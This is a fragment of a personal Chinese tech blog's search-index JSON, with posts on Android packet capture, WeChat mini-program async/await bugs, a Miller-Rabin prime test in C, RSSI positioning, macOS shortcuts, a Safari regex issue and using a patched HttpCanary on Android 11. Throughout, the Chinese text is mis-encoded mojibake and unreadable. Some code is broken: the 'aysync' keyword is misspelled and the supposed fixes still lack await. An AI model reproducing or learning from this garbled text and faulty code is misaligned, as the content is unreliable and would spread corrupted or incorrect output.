æœ€åˆæ¥è§¦AndroidæŠ“åŒ…ï¼Œæ˜¯éœ€è¦rootçš„æŠ“åŒ…ç²¾çµã€‚ä¹‹ååœ¨Windowsä¸Šä½¿ç”¨äº†å¾ˆä¹…çš„Fiddlerï¼Œå¹¶äº†è§£åˆ°FDä¹Ÿèƒ½ä»£ç†æŠ“åŒ…Androidï¼Œè¢«FDç®€æ´ä¸”å¼ºå¤§çš„åŠŸèƒ½å¸å¼•ã€‚å†ä¹‹ååˆ°ç°åœ¨ï¼Œä½¿ç”¨æœ€å¤šçš„æ˜¯HttpCanaryï¼Œåœ¨Androidå¹³å°ä¸Šé¢å»äº†windowsä»£ç†çš„éº»çƒ¦ï¼Œè€Œä¸”åŠ«æŒæ³¨å…¥ç­‰åŠŸèƒ½ä¹Ÿå¾ˆå¼ºå¤§ã€‚ä½†æ˜¯ä»Android11å¼€å§‹ï¼Œè½¯ä»¶çš„è¯ä¹¦å®‰è£…å‡ºç°é—®é¢˜ï¼Œæœ¬æ¥ä»¥ä¸ºä½œè€…ä¼šå°½å¿«ä¿®å¤bugï¼Œæä¾›è¯ä¹¦å¯¼å‡ºæ‰‹åŠ¨å®‰è£…åŠŸèƒ½ï¼Œä½†åˆ°ç°åœ¨Android12è½¯ä»¶é—ªé€€ï¼Œ11ä¸Šçš„è¯ä¹¦é—®é¢˜ä¾æ—§æ²¡æœ‰è§£å†³ã€‚é‚å†³å®šå†™æ–‡æ€»ç»“ä¹‹å‰çš„æŠ“åŒ…ç»å†ï¼Œä»¥åŠä¹‹åå¦‚ä½•ä¼˜é›…åœ°æŠ“åŒ…ã€‚ ä½¿ç”¨è¿‡çš„æŠ“åŒ…å·¥å…· æŠ“åŒ…ç²¾çµï¼ˆPacket Captureï¼‰ wicapæŠ“åŒ…å·¥å…· Fiddler HttpCanary","categories":[{"name":"é€†å‘","slug":"é€†å‘","permalink":"https://qilianshuo.github.io/categories/%E9%80%86%E5%90%91/"}],"tags":[{"name":"æŠ“åŒ…","slug":"æŠ“åŒ…","permalink":"https://qilianshuo.github.io/tags/%E6%8A%93%E5%8C%85/"}]},{"title":"å°ç¨‹åºasync-awaitåŒå¼‚æ­¥é—®é¢˜","slug":"å°ç¨‹åºasync-awaitåŒå¼‚æ­¥é—®é¢˜","date":"2022-03-15T15:41:44.000Z","updated":"2022-03-21T08:55:02.158Z","comments":true,"path":"2022/03/15/å°ç¨‹åºasync-awaitåŒå¼‚æ­¥é—®é¢˜/","link":"","permalink":"https://qilianshuo.github.io/2022/03/15/%E5%B0%8F%E7%A8%8B%E5%BA%8Fasync-await%E5%90%8C%E5%BC%82%E6%AD%A5%E9%97%AE%E9%A2%98/","excerpt":"ä¸ç†Ÿæ‚‰nodeå¼€å‘å’Œå°ç¨‹åºï¼ŒæŸæ¬¡å°é¡¹ç›®é‡åˆ°ä¸€äº›å¼‚æ­¥é—®é¢˜ï¼Œåœ¨æ­¤è®°å½•ğŸ“ã€‚ 1. è°ƒç”¨å¼‚æ­¥å‡½æ•°å´©æºƒğŸ˜¡123exports.userLogin = async (uname, password) =&gt; &#123; //pass&#125; æè¿°ï¼šåœ¨utils.jsä¸­å†™äº†userLoginå‡½æ•°ï¼Œåœ¨login/login.jsç™»é™†é¡µçš„loginå‡½æ•°ä¸­è°ƒç”¨ï¼Œç›´æ¥å´©æºƒã€‚å¦‚ä¸‹ï¼š 12345login: function () &#123; //â€¦â€¦ let cookies = userLogin(phone_number, password); //â€¦â€¦&#125;","text":"ä¸ç†Ÿæ‚‰nodeå¼€å‘å’Œå°ç¨‹åºï¼ŒæŸæ¬¡å°é¡¹ç›®é‡åˆ°ä¸€äº›å¼‚æ­¥é—®é¢˜ï¼Œåœ¨æ­¤è®°å½•ğŸ“ã€‚ 1. è°ƒç”¨å¼‚æ­¥å‡½æ•°å´©æºƒğŸ˜¡123exports.userLogin = async (uname, password) =&gt; &#123; //pass&#125; æè¿°ï¼šåœ¨utils.jsä¸­å†™äº†userLoginå‡½æ•°ï¼Œåœ¨login/login.jsç™»é™†é¡µçš„loginå‡½æ•°ä¸­è°ƒç”¨ï¼Œç›´æ¥å´©æºƒã€‚å¦‚ä¸‹ï¼š 12345login: function () &#123; //â€¦â€¦ let cookies = userLogin(phone_number, password); //â€¦â€¦&#125; åäº†è§£åˆ°asyncå¿…é¡»å’Œawaitä¸€èµ·ä½¿ç”¨ï¼Œé‚æ›´æ”¹ä»£ç ä¸ºï¼š 1let cookies = await userLogin(phone_number, password); ä»ç„¶å´©æºƒï¼Œå› ä¸ºloginä¸æ˜¯å¼‚æ­¥å‡½æ•°ï¼Œè¿™æ—¶è§£å†³æ–¹æ³•æœ‰ä¸¤ç§ï¼Œç¬¬ä¸€ç§æ˜¯æ›´æ”¹loginçš„å‡½æ•°ç±»å‹ï¼ŒåŠ ä¸Šasyncä¿®é¥°ï¼›å¦ä¸€ç§æ˜¯ç”¨å¼‚æ­¥å‡½æ•°æŠŠå¼‚æ­¥è¯­å¥åŒ…è£¹ä»è€Œå’Œloginåˆ†ç¦»ã€‚ 1234567891011//æ–¹æ³•ä¸€login: aysync function () &#123; let cookies = userLogin(phone_number, password);&#125;//æ–¹æ³•äºŒlogin: function () &#123; !async function () &#123; let cookies = userLogin(phone_number, password); &#125; ()&#125; 2. wx.request() success å›è°ƒåŒæ­¥ğŸ¤•wx.requestä¸ºå¼‚æ­¥å‡½æ•°ï¼Œè¯·æ±‚æˆåŠŸåè§¦å‘success`å›è°ƒï¼Œæ— æ³•æŠŠè¯·æ±‚æ•°æ®ä¼ å‡ºã€‚ æœ€å¼€å§‹ä½¿ç”¨äº†ä¸€ç§éå¸¸ç¬¨æ‹™ä¸”ä¸ä¼˜é›…çš„æ–¹å¼ä¼ å‡ºæ•°æ®ï¼šé¡µé¢çš„dataæ•°æ®å­—å…¸ï¼Œé€šè¿‡åœ¨å›è°ƒå‡½æ•°ä¸­that.setData()å­˜å‚¨æ•°æ®ï¼Œç„¶ååœ¨å¤–éƒ¨ä½¿ç”¨this.data.â€¦å–å‡ºæ•°æ®ã€‚ åé¢å®åœ¨æ— æ³•å¿å—è¿™ç§ä¸æ–¹ä¾¿çš„å†™æ³•ï¼Œæ‰¾åˆ°äº†Promiseçš„è§£å†³æ–¹æ¡ˆã€‚ä½¿ç”¨resolve()æŠŠæ•°æ®ä¼ å‡ºï¼Œä½†éœ€è¦åœ¨å‰é¢åŠ ä¸Šawaitæ¥ç­‰å¾…å¼‚æ­¥requestæ‰§è¡Œå®Œæ¯•ï¼Œä¸ç„¶åªä¼šå¾—åˆ°Promiseå¯¹è±¡ã€‚ 12345678910let resp = await new Promise((resolve) =&gt; &#123; wx.request(&#123; url: URL, method: METHOD, header: &#123;&#125;, success: res =&gt; &#123; resolve(res.data) &#125; &#125;)&#125;) 3. wx.request success å›è°ƒä¸­æ·»åŠ å¼‚æ­¥è¿‡ç¨‹ğŸ¥´åŸå§‹ä»£ç å¦‚ä¸‹ï¼š 1234567async function testFun () &#123; wx.request(&#123; success: res =&gt; &#123; let a = await â€¦â€¦ &#125; &#125;)&#125; æœ¬ä»¥ä¸ºwx.requestçš„å¤–å±‚å‡½æ•°è¢«asyncä¿®é¥°ï¼Œå¯ä»¥æ·»åŠ awaitåŒæ­¥ï¼Œä½†ä¸Šé¢ä»£ç æŠ¥é”™againã€‚ è§£å†³æ–¹æ³•æ˜¯ç”¨asyncä¿®é¥°successçš„å›è°ƒå‡½æ•°ï¼š 1234567async function testFun () &#123; wx.request(&#123; success: async function (res) &#123; let a = await â€¦â€¦ &#125; &#125;)&#125; æš‚æ—¶è®°ä¸èµ·æ›´å¤šé—®é¢˜äº†ï¼Œæ—¥åè¿½æ›´ï½ï¼ˆå¸Œæœ›æ°¸è¿œä¸è¦æ›´æ–°ï¼‰(â—â€¿â—‘)","categories":[{"name":"è¸©å‘è®°å½•ğŸ“","slug":"è¸©å‘è®°å½•ğŸ“","permalink":"https://qilianshuo.github.io/categories/%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95%F0%9F%93%9D/"}],"tags":[{"name":"å°ç¨‹åº","slug":"å°ç¨‹åº","permalink":"https://qilianshuo.github.io/tags/%E5%B0%8F%E7%A8%8B%E5%BA%8F/"},{"name":"jså¼‚æ­¥","slug":"jså¼‚æ­¥","permalink":"https://qilianshuo.github.io/tags/js%E5%BC%82%E6%AD%A5/"}]},{"title":"Miller-Rabinç´ æ•°æµ‹è¯•ç®—æ³•","slug":"Miller-Rabinç´ æ•°æµ‹è¯•ç®—æ³•","date":"2022-03-15T10:42:01.000Z","updated":"2022-03-21T08:53:44.921Z","comments":true,"path":"2022/03/15/Miller-Rabinç´ æ•°æµ‹è¯•ç®—æ³•/","link":"","permalink":"https://qilianshuo.github.io/2022/03/15/Miller-Rabin%E7%B4%A0%E6%95%B0%E6%B5%8B%E8%AF%95%E7%AE%97%E6%B3%95/","excerpt":"å­¦ä¹ RSAè¿‡ç¨‹ä¸­ç”¨åˆ°äº†å¤§ç´ æ•°ï¼Œè®°å½•å­¦ä¹ è¿‡ç¨‹ã€‚ ç›®å‰æ²¡æœ‰ç®—æ³•èƒ½å¤Ÿç›´æ¥ç”Ÿæˆä¸€ä¸ªç´ æ•°ï¼ˆæ®æœ¬äººäº†è§£ï¼‰ï¼Œåªèƒ½é€šè¿‡ä¸æ–­ç”Ÿæˆéšæœºæ•°ç›´åˆ°äº§ç”Ÿç´ æ•°çš„æ–¹æ³•æ¥ç”Ÿæˆã€‚å¦‚æœ$n$è¾ƒå°ï¼Œå¯ä»¥ç›´æ¥å¯¹$2$åˆ°$\\sqrt{n}$ çš„æ‰€æœ‰æ•´æ•°å–æ¨¡éªŒè¯ï¼Œä½†å½“$n$ç‰¹åˆ«å¤§æ—¶ï¼Œ$O(\\sqrt{n})$ å¤æ‚åº¦è€—è´¹çš„å¤§é‡æ—¶é—´æ˜¯ä¸èƒ½è¢«æ¥å—çš„ã€‚æ­¤æ—¶å¦‚æœç‰ºç‰²éƒ¨åˆ†å‡†ç¡®åº¦æ¥æ¢å–æ—¶é—´çš„ä¼˜åŒ–ï¼Œå³Miller-Rabinç®—æ³•çš„æ€æƒ³ã€‚ æ ¹æ®ç™¾åº¦ç™¾ç§‘ï¼Œä½¿ç”¨å¿«é€Ÿå¹‚è¿ç®—ï¼Œè¿™ä¸ªç®—æ³•çš„æ—¶é—´å¤æ‚åº¦æ˜¯ $O(ğ‘˜\\log^3ğ‘›)$ ï¼Œåˆ¤é”™æ¦‚ç‡\u0005æ˜¯$4^{-k}$ï¼Œ$k$ä¸ºåˆ¤æ–­æ¬¡æ•°ã€‚ä¸‹é¢ä¸ºè¯¥ç®—æ³•çš„å®ç°åŸç†ã€‚ å¼•ç†1. è´¹é©¬å°å®šç†","text":"å­¦ä¹ RSAè¿‡ç¨‹ä¸­ç”¨åˆ°äº†å¤§ç´ æ•°ï¼Œè®°å½•å­¦ä¹ è¿‡ç¨‹ã€‚ ç›®å‰æ²¡æœ‰ç®—æ³•èƒ½å¤Ÿç›´æ¥ç”Ÿæˆä¸€ä¸ªç´ æ•°ï¼ˆæ®æœ¬äººäº†è§£ï¼‰ï¼Œåªèƒ½é€šè¿‡ä¸æ–­ç”Ÿæˆéšæœºæ•°ç›´åˆ°äº§ç”Ÿç´ æ•°çš„æ–¹æ³•æ¥ç”Ÿæˆã€‚å¦‚æœ$n$è¾ƒå°ï¼Œå¯ä»¥ç›´æ¥å¯¹$2$åˆ°$\\sqrt{n}$ çš„æ‰€æœ‰æ•´æ•°å–æ¨¡éªŒè¯ï¼Œä½†å½“$n$ç‰¹åˆ«å¤§æ—¶ï¼Œ$O(\\sqrt{n})$ å¤æ‚åº¦è€—è´¹çš„å¤§é‡æ—¶é—´æ˜¯ä¸èƒ½è¢«æ¥å—çš„ã€‚æ­¤æ—¶å¦‚æœç‰ºç‰²éƒ¨åˆ†å‡†ç¡®åº¦æ¥æ¢å–æ—¶é—´çš„ä¼˜åŒ–ï¼Œå³Miller-Rabinç®—æ³•çš„æ€æƒ³ã€‚ æ ¹æ®ç™¾åº¦ç™¾ç§‘ï¼Œä½¿ç”¨å¿«é€Ÿå¹‚è¿ç®—ï¼Œè¿™ä¸ªç®—æ³•çš„æ—¶é—´å¤æ‚åº¦æ˜¯ $O(ğ‘˜\\log^3ğ‘›)$ ï¼Œåˆ¤é”™æ¦‚ç‡\u0005æ˜¯$4^{-k}$ï¼Œ$k$ä¸ºåˆ¤æ–­æ¬¡æ•°ã€‚ä¸‹é¢ä¸ºè¯¥ç®—æ³•çš„å®ç°åŸç†ã€‚ å¼•ç†1. è´¹é©¬å°å®šç†å¦‚æœ$p$æ˜¯ç´ æ•°ï¼Œä¸” $gcd(a, p) = 1$ ï¼Œåˆ™æœ‰ $a^{p-1}\\equiv 1 \\pmod {p}$ ã€‚ å®ƒçš„é€†å‘½é¢˜å¹¶ä¸èƒ½æ¨å‡º$p$ä¸ºç´ æ•°ï¼Œä½†å¦‚æœä¸æ»¡è¶³ $a^{p-1} \\equiv 1 \\pmod {p}$ çš„$p$ä¸€å®šæ˜¯åˆæ•°ã€‚ 2. æœ‰é™åŸŸä¸Šçš„å¹³æ–¹æ ¹å®šç†å¦‚æœ$p$æ˜¯ä¸€ä¸ªå¥‡è´¨æ•°ï¼Œä¸” $e \\geq 1$ ï¼Œåˆ™æ–¹ç¨‹ x^2 \\equiv 1 \\pmod {p^e}ä»…æœ‰ä¸¤ä¸ªæ ¹ $x=1$ æˆ–è€… $x=-1$ ï¼Œ$\\pm1$ä¹Ÿç§°ä¸º1çš„å¹³å‡¡å¹³æ–¹æ ¹ã€‚ åœ¨ $e=1$ å³æ¨¡$p$çš„æƒ…å†µä¸‹ï¼Œ$x=-1$ç­‰ä»·äº$x=p-1$ ã€‚ æŠŠ $x = 1$ å’Œ $x = p-1$ ç§°ä¸ºâ€œ$x$å¯¹æ¨¡$p$æ¥è¯´1çš„å¹³å‡¡å¹³æ–¹æ ¹â€ä¸å¤ªé€šé¡ºï¼ŒMiller-Rabinç´¢æ€§æµ‹è¯•ç”¨åˆ°è¿™ä¸ªæ–¹ç¨‹ï¼š$x^2 \\equiv 1 \\pmod {n}$ ã€‚å¦‚æœä¸€ä¸ªæ•°$x$æ»¡è¶³æ–¹ç¨‹$x^2 \\equiv 1 \\pmod {ğ‘›}$ï¼Œä½†$x$ä¸ç­‰äºå¹³å‡¡å¹³æ–¹æ ¹1æˆ–$n-1$ ï¼Œé‚£ä¹ˆç§°$x$æ˜¯å¯¹æ¨¡næ¥è¯´1çš„â€œéå¹³å‡¡â€å¹³æ–¹æ ¹ã€‚ä¾‹å¦‚ï¼Œ$x=6$ , $n=35$ ï¼Œ6æ˜¯å¯¹æ¨¡35æ¥è¯´1çš„éå¹³å‡¡å¹³æ–¹æ ¹ã€‚ æ¨è®ºï¼šå¦‚æœå¯¹æ¨¡nå­˜åœ¨1çš„éå¹³å‡¡å¹³æ–¹æ ¹ï¼Œåˆ™næ˜¯åˆæ•°ã€‚ Miller-Rabinç®—æ³•åˆ¤æ–­ä¸€ä¸ªå¤§æ•°næ˜¯å¦ä¸ºç´ æ•°æ—¶ï¼Œå¯ä»¥åˆ©ç”¨ä¸Šé¢çš„è´¹é©¬å°å®šç† $a^{n-1} \\equiv 1 \\pmod {n}$ ï¼Œå¦‚æœä¸æ»¡è¶³è¯¥å¼ï¼Œåˆ™å¯æ–­å®šnä¸ºåˆæ•°ã€‚ä½†åœ¨è¯¥åˆ¤æ–­å‰å¯ä»¥ç”¨å¼•ç†2çš„æ¨ç†è¿›ä¸€æ­¥å¢å¼ºå‡†ç¡®æ€§ã€‚ å¯¹äºå¶æ•°$n-1$ ï¼Œä¸€å®šå¯ä»¥æ‹†åˆ†ä¸º $n-1 = 2 ^ s * d$ ï¼š a ^ {n-1} = a ^ {2 ^ {s} * d} = (((a^d)^2)\\cdots)^2ä»$x=a^d$å¼€å§‹ï¼Œä¾æ¬¡å¹³æ–¹sæ¬¡ï¼Œæ¯æ¬¡å¹³æ–¹çš„æ—¶å€™æ¨¡nã€‚ç”±æœ‰é™åŸŸä¸Šçš„å¹³æ–¹æ ¹å®šç†å¯çŸ¥ï¼Œå¦‚æœæ¨¡næ—¶ç»“æœä¸º1ï¼Œé‚£ä¹ˆ$x$ä¸€å®šæ˜¯1æˆ–è€…$n-1$ï¼Œå¦‚æœä¸æ»¡è¶³åˆ™nä¸ºåˆæ•°ã€‚å¦‚æœ$x$ä¸º1çš„å¹³å‡¡å¹³æ–¹æ ¹æˆ–æ¨¡nçš„ç»“æœä¸ä¸º1ï¼Œ$x = x^2$ç»§ç»­ä¸‹ä¸€æ¬¡å¹³æ–¹ï¼Œç„¶åæ¨¡nåˆ¤æ–­ã€‚ å½“å¹³æ–¹åˆ°äº†sæ¬¡ï¼Œæ­¤æ—¶$x = a ^ {n-1}$ ï¼Œåˆ¤æ–­$x$æ¨¡nçš„ç»“æœæ˜¯å¦ä¸º1ã€‚å¦‚æœä¸ä¸º1åˆ¤å®šnä¸ºåˆæ•°ï¼Œå¦‚æœä¸º1åˆ™å¯è®¤ä¸ºnå¤§æ¦‚ç‡ä¸ºç´ æ•°ã€‚ ç®—æ³•çš„ä»£ç å®ç° åœ¨è¿›è¡Œ$a^{d} \\pmod n$ å’Œ $x^2 \\pmod n$æ—¶å¦‚æœç›´æ¥è¿ç®—ï¼Œå¤§æ¦‚ç‡ä¼šæº¢å‡ºï¼Œæ‰€ä»¥éœ€è¦ä½¿ç”¨å¿«é€Ÿå¹‚å’Œå¿«é€Ÿä¹˜ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;typedef long long ll;ll qMul(ll a, ll b, ll mod);ll qPow(ll base, ll power, ll mod);int Miller_Rabin(ll n, int repeat);int main() &#123; ll n; while (printf(&quot;Input a n to judge:\\n&quot;) &amp;&amp; scanf(&quot;%lld&quot;, &amp;n) != EOF) &#123; printf(Miller_Rabin(n, 10) ? &quot;Yes\\n\\n&quot; : &quot;No\\n\\n&quot;); &#125; return 0;&#125;//quick multiplyll qMul(ll a, ll b, ll mod) &#123; ll ret = 0; while (b) &#123; if (b &amp; 1) ret = (ret + a) % mod; a = (a + a) % mod; b &gt;&gt;= 1; &#125; return ret;&#125;//quick powerll qPow(ll base, ll power, ll mod) &#123; ll ret = 1; while (power) &#123; if (power &amp; 1) ret = qMul(ret, base, mod); base = qMul(base, base, mod); power &gt;&gt;= 1; &#125; return ret % mod;&#125;int Miller_Rabin(ll n, int repeat) &#123; if (n == 2 || n == 3) return 1; if (n % 2 == 0 || n == 1) return 0; ll d = n - 1; int s = 0; while (!(d &amp; 1)) ++s, d &gt;&gt;= 1; for (int i = 0; i &lt; repeat; i++) &#123; ll a = rand() % (n - 3) + 2; ll x = qPow(a, d, n); ll y = 0; for (int j = 0; j &lt; s; j++) &#123; y = qMul(x, x, n); if (y == 1 &amp;&amp; x != 1 &amp;&amp; x != (n - 1)) return 0; x = y; &#125; if (y != 1) return 0; &#125; return 1;&#125;","categories":[{"name":"ç®—æ³•","slug":"ç®—æ³•","permalink":"https://qilianshuo.github.io/categories/%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"ç´ æ•°","slug":"ç´ æ•°","permalink":"https://qilianshuo.github.io/tags/%E7%B4%A0%E6%95%B0/"},{"name":"ç®—æ³•","slug":"ç®—æ³•","permalink":"https://qilianshuo.github.io/tags/%E7%AE%97%E6%B3%95/"}]},{"title":"RSSIå®šä½ç®—æ³•å­¦ä¹ ","slug":"RSSIå®šä½ç®—æ³•å­¦ä¹ ","date":"2022-03-01T10:20:08.000Z","updated":"2022-03-21T08:53:15.164Z","comments":true,"path":"2022/03/01/RSSIå®šä½ç®—æ³•å­¦ä¹ /","link":"","permalink":"https://qilianshuo.github.io/2022/03/01/RSSI%E5%AE%9A%E4%BD%8D%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"Kæœ€è¿‘é‚»å±…æ³• DV-Hopæ³• è´¨å¿ƒå®šä½ç®—æ³• åŠ æƒè´¨å¿ƒå®šä½ç®—æ³• ä¸‰è¾¹å®šä½ç®—æ³• AOAå®šä½ç®—æ³• TOA/TDOAç®—æ³•","categories":[{"name":"å­¦ä¹ ç¬”è®°","slug":"å­¦ä¹ ç¬”è®°","permalink":"https://qilianshuo.github.io/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"RSSI","slug":"RSSI","permalink":"https://qilianshuo.github.io/tags/RSSI/"},{"name":"å®šä½","slug":"å®šä½","permalink":"https://qilianshuo.github.io/tags/%E5%AE%9A%E4%BD%8D/"}]},{"title":"mac OSå¿«æ·é”®","slug":"mac-OSå¿«æ·é”®","date":"2022-02-14T08:16:03.000Z","updated":"2022-03-21T08:55:56.300Z","comments":true,"path":"2022/02/14/mac-OSå¿«æ·é”®/","link":"","permalink":"https://qilianshuo.github.io/2022/02/14/mac-OS%E5%BF%AB%E6%8D%B7%E9%94%AE/","excerpt":"ğŸ€æŒç»­æ›´æ–°ä¸­ï½ æ–‡ç¨¿å¿«æ·é”®âŒ˜ + â†‘ï¼šæ–‡ç¨¿å¼€å¤´ âŒ˜ + â†“ï¼šæ–‡ç¨¿æœ«å°¾ âŒ˜ + â†’ ï¼šè¡Œé¦–ï¼ˆHomeï¼‰","text":"ğŸ€æŒç»­æ›´æ–°ä¸­ï½ æ–‡ç¨¿å¿«æ·é”®âŒ˜ + â†‘ï¼šæ–‡ç¨¿å¼€å¤´ âŒ˜ + â†“ï¼šæ–‡ç¨¿æœ«å°¾ âŒ˜ + â†’ ï¼šè¡Œé¦–ï¼ˆHomeï¼‰ âŒ˜ + â† ï¼šè¡Œå°¾ï¼ˆEndï¼‰ âŒ¥ + â† ï¼šå•è¯é¦– âŒ¥ + â†’ï¼š å•è¯å°¾ âŒƒ + Aï¼šè¡Œæˆ–æ®µè½å¼€å¤´ âŒƒ + Eï¼šè¡Œæˆ–æ®µè½æœ«å°¾ âŒƒ + Fï¼šå‘å‰ä¸€å­—ç¬¦ âŒƒ + Bï¼šå‘åä¸€å­—ç¬¦ âŒƒ + Nï¼šä¸‹ä¸€è¡Œ âŒƒ + Pï¼šä¸Šä¸€è¡Œ Macä¿®é¥°é”®æ ·å¼ â‡ª Caps Lock âŒ˜ Command âŒ¥ Option â‡§ Shift âŒƒ Control","categories":[{"name":"å­¦ä¹ ç¬”è®°","slug":"å­¦ä¹ ç¬”è®°","permalink":"https://qilianshuo.github.io/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Mac OS","slug":"Mac-OS","permalink":"https://qilianshuo.github.io/tags/Mac-OS/"},{"name":"å¿«æ·é”®","slug":"å¿«æ·é”®","permalink":"https://qilianshuo.github.io/tags/%E5%BF%AB%E6%8D%B7%E9%94%AE/"}]},{"title":"Safariæ­£åˆ™å…¼å®¹é—®é¢˜è®°å½•","slug":"Safariæ­£åˆ™å…¼å®¹é—®é¢˜è®°å½•","date":"2022-02-13T05:05:32.000Z","updated":"2022-03-21T08:52:59.787Z","comments":true,"path":"2022/02/13/Safariæ­£åˆ™å…¼å®¹é—®é¢˜è®°å½•/","link":"","permalink":"https://qilianshuo.github.io/2022/02/13/Safari%E6%AD%A3%E5%88%99%E5%85%BC%E5%AE%B9%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95/","excerpt":"HaloæŸä¸»é¢˜ä»£ç æ¸²æŸ“å‡ºç°é—®é¢˜ï¼ŒæŸ¥çœ‹æ§åˆ¶å°å‘ç°æŠ¥é”™å¦‚ä¸‹ï¼š å®šä½åˆ°é”™è¯¯ä»£ç ï¼š 12345var reg = new RegExp(&quot;(?&lt;=]).+(?=\\\\[/)&quot;, &quot;g&quot;);var noway = new RegExp(&quot;(?=\\\\[noway])(\\\\S*)(\\\\[/noway]=?)&quot;, &quot;g&quot;);var buy = new RegExp(&quot;(?=\\\\[buy])(\\\\S*)(\\\\[/buy]=?)&quot;, &quot;g&quot;);var task = new RegExp(&quot;(?=\\\\[task])(\\\\S*)(\\\\[/task]=?)&quot;, &quot;g&quot;);var warning = new RegExp(&quot;(?=\\\\[warning])(\\\\S*)(\\\\[/warning]=?)&quot;, &quot;g&quot;); é”™è¯¯åˆ†æ","text":"HaloæŸä¸»é¢˜ä»£ç æ¸²æŸ“å‡ºç°é—®é¢˜ï¼ŒæŸ¥çœ‹æ§åˆ¶å°å‘ç°æŠ¥é”™å¦‚ä¸‹ï¼š å®šä½åˆ°é”™è¯¯ä»£ç ï¼š 12345var reg = new RegExp(&quot;(?&lt;=]).+(?=\\\\[/)&quot;, &quot;g&quot;);var noway = new RegExp(&quot;(?=\\\\[noway])(\\\\S*)(\\\\[/noway]=?)&quot;, &quot;g&quot;);var buy = new RegExp(&quot;(?=\\\\[buy])(\\\\S*)(\\\\[/buy]=?)&quot;, &quot;g&quot;);var task = new RegExp(&quot;(?=\\\\[task])(\\\\S*)(\\\\[/task]=?)&quot;, &quot;g&quot;);var warning = new RegExp(&quot;(?=\\\\[warning])(\\\\S*)(\\\\[/warning]=?)&quot;, &quot;g&quot;); é”™è¯¯åˆ†ææ ¹æ®æ§åˆ¶å°æŠ¥é”™ï¼Œé—®é¢˜å‡ºç°åœ¨æ­£åˆ™åŒ¹é…å¼ä¸Šã€‚å°è¯•åœ¨Chromeä¸Šè¿è¡Œè¯¥è¡Œä»£ç ï¼Œæ— æŠ¥é”™ï¼Œè‡³æ­¤å¯ä»¥è‚¯å®šæ˜¯æµè§ˆå™¨çš„å…¼å®¹æ€§é—®é¢˜ã€‚ ç»æŸ¥é˜…å‘ç°Safariä¸æ”¯æŒé›¶å®½æ–­è¨€ï¼Œå³?&lt;=ã€?=ï¼Œè§£å†³åŠæ³•æ˜¯ä½¿ç”¨å…¶å®ƒè¡¨è¾¾å¼æ›¿æ¢é›¶å®½æ–­è¨€ã€‚","categories":[{"name":"è¸©å‘è®°å½•ğŸ“","slug":"è¸©å‘è®°å½•ğŸ“","permalink":"https://qilianshuo.github.io/categories/%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95%F0%9F%93%9D/"}],"tags":[{"name":"æ­£åˆ™","slug":"æ­£åˆ™","permalink":"https://qilianshuo.github.io/tags/%E6%AD%A3%E5%88%99/"},{"name":"Safari","slug":"Safari","permalink":"https://qilianshuo.github.io/tags/Safari/"}]},{"title":"Android11ä½¿ç”¨HttpCanary","slug":"Android11ä½¿ç”¨HttpCanary","date":"2022-02-12T13:55:22.000Z","updated":"2022-03-21T08:54:44.399Z","comments":true,"path":"2022/02/12/Android11ä½¿ç”¨HttpCanary/","link":"","permalink":"https://qilianshuo.github.io/2022/02/12/Android11%E4%BD%BF%E7%94%A8HttpCanary/","excerpt":"Android11æ›´æ”¹äº†CAè¯ä¹¦å®‰è£…æœºåˆ¶ï¼Œä¸ºä¿è¯å®‰å…¨å…³é—­äº†ç¬¬ä¸‰æ–¹åº”ç”¨å®‰è£…è¯ä¹¦çš„æ¥å£ï¼Œåªèƒ½é€šè¿‡ç³»ç»Ÿè®¾ç½®å®‰è£…è¯ä¹¦ã€‚ HttpCanaryåªæœ‰åœ¨å®‰è£…å®Œè¯ä¹¦åæ‰èƒ½å¯¼å‡ºpemå¯†é’¥ï¼Œè¿™ä¹Ÿå¯¼è‡´å…¶åœ¨Android11ä¸Šæ— æ³•ä½¿ç”¨ã€‚ ç›®å‰çš„è§£å†³åŠæ³•é€šå¸¸æ˜¯ä»è½¯ä»¶çš„ç¼“å­˜ç›®å½•ä¸­æå–å‡ºCAè¯ä¹¦ç„¶ååœ¨è®¾ç½®ä¸­å®‰è£…ï¼Œä½†éœ€è¦rootæƒé™æ‰èƒ½è®¿é—®/dataç›®å½•ã€‚ æœ€è¿‘å‘ç°äº†é’ˆå¯¹è¯ä¹¦é—®é¢˜çš„ä¿®æ”¹ç‰ˆï¼Œhookè¯ä¹¦å®‰è£…éªŒè¯å‡½æ•°ï¼Œä½¿è½¯ä»¶å¾—åˆ°çš„æ•°æ®å§‹ç»ˆä¸ºå·²å®‰è£…è¯ä¹¦ï¼Œè¿™æ ·å°±å¯ä»¥å¯¼å‡ºè¯ä¹¦å»è®¾ç½®é‡Œå®‰è£…ã€‚æ¬è¿æ–‡ä»¶ä¸‹è½½åœ°å€ã€‚","text":"Android11æ›´æ”¹äº†CAè¯ä¹¦å®‰è£…æœºåˆ¶ï¼Œä¸ºä¿è¯å®‰å…¨å…³é—­äº†ç¬¬ä¸‰æ–¹åº”ç”¨å®‰è£…è¯ä¹¦çš„æ¥å£ï¼Œåªèƒ½é€šè¿‡ç³»ç»Ÿè®¾ç½®å®‰è£…è¯ä¹¦ã€‚ HttpCanaryåªæœ‰åœ¨å®‰è£…å®Œè¯ä¹¦åæ‰èƒ½å¯¼å‡ºpemå¯†é’¥ï¼Œè¿™ä¹Ÿå¯¼è‡´å…¶åœ¨Android11ä¸Šæ— æ³•ä½¿ç”¨ã€‚ ç›®å‰çš„è§£å†³åŠæ³•é€šå¸¸æ˜¯ä»è½¯ä»¶çš„ç¼“å­˜ç›®å½•ä¸­æå–å‡ºCAè¯ä¹¦ç„¶ååœ¨è®¾ç½®ä¸­å®‰è£…ï¼Œä½†éœ€è¦rootæƒé™æ‰èƒ½è®¿é—®/dataç›®å½•ã€‚ 